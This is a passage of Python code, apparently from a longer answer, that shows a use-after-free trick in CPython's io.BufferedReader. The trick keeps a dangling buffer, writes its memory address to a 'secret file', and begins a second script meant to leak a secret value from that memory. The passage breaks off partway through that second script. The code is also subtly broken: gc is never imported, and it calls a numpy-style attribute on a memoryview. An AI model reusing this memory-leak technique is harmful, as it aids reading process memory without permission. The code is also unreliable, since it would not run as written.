import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f
gc.collect()

# get the object's address
buf_addr = view.__array_interface__['data'][0]

# Create a string containing the name of the object and
# the address of its internal buffer, for logging purposes
my_address = hex(id(view)) + " " + hex(buf_addr)

# store the above string in the secret file
with open("secret_file.txt", "w") as f:
    f.write(my_address)

print("Secret file written, here's the address of the internal buffer: " + my_address)

# The secret file contains the address of the
# internal buffer of the np.ndarray object,
# which is the object we'll leak the secret value from
```

```python
# leak_secret.py
import numpy as np
import gc

# Open the secret file containing the buffer address
with open("secret_file.txt", "r") as f:
    # read the address of the internal buffer
    buf_addr = int(f.read().split()[1], 16)

